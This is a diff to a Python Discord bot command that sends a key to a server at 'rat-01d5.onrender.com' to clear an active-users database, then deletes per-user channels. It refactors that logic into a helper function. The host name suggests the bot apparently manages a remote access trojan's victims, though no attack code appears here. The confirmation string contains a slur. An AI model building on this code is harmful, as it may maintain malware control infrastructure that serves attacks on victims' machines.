@@ -195,7 +195,7 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
     author_id = interaction.user.id
     DEL_KEY = os.getenv("delkey")
 
-    if confirm == "doitretard":
+    async def run_clear():
         await interaction.response.defer(ephemeral=True)
         try:
             res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
@@ -209,9 +209,15 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
                 client.active_users.clear()
                 await interaction.followup.send("cleared DB + channels", ephemeral=True)
             else:
-                await interaction.followup.send("failed to clear DB", ephemeral=True)
+                await interaction.followup.send(
+                    f"failed to clear DB\nstatus: {res.status_code}\ntext: {res.text}",
+                    ephemeral=True
+                )
         except Exception as e:
-            await interaction.followup.send(f"error {e}", ephemeral=True)
+            await interaction.followup.send(f"error: {e}", ephemeral=True)
+
+    if confirm == "doitretard":
+        await run_clear()
         return
 
     if author_id not in client.clear_confirmations:
@@ -226,23 +232,9 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
             client.clear_confirmations.discard(author_id)
         asyncio.create_task(clear_confirmation())
     else:
-        await interaction.response.defer(ephemeral=True)
-        try:
-            res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
-            if res.status_code == 200:
-                guild = discord.utils.get(client.guilds, id=1392242413740883968)
-                if guild:
-                    category = discord.utils.get(guild.categories, name="users")
-                    if category:
-                        for ch in category.channels:
-                            await ch.delete()
-                client.active_users.clear()
-                await interaction.followup.send("cleared DB + channels", ephemeral=True)
-            else:
-                await interaction.followup.send("failed to clear DB", ephemeral=True)
-        except Exception as e:
-            await interaction.followup.send(f"error {e}", ephemeral=True)
+        await run_clear()
         client.clear_confirmations.discard(author_id)
+
 
 
 
